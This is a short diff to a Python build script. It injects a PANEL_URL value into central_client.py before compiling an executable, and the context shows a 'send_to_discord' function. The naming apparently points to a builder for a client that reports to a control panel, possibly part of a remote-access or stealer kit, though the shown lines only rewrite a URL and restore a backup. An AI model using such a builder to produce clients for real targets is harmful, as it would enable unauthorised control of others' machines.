@@ -73,10 +73,33 @@ async def send_to_discord(file_path):
 
 
 if __name__ == "__main__":
+    import shutil
+    
+    # Inject panel URL into central_client before build
+    panel_url = os.environ.get('PANEL_URL', '')
+    central_py = Path(__file__).parent / 'central_client.py'
+    backup_py = Path(__file__).parent / 'central_client.py.bak'
+    
+    if panel_url and central_py.exists():
+        shutil.copy2(central_py, backup_py)
+        with open(central_py, 'r', encoding='utf-8') as f:
+            code = f.read()
+        code = code.replace(
+            "os.environ.get('PANEL_URL', 'http://localhost:5000')",
+            f"'{panel_url}'"
+        )
+        with open(central_py, 'w', encoding='utf-8') as f:
+            f.write(code)
+        print(f"[BUILD] Panel URL injetada: {panel_url}")
+    
     builder = BuilderV2()
-
     success = builder.main()
-
+    
+    # Restore original central_client.py
+    if backup_py.exists():
+        shutil.copy2(backup_py, central_py)
+        backup_py.unlink()
+    
     if success:
         exe_path = builder.dist_dir / builder.output_name
         print("\n" + "="*80)
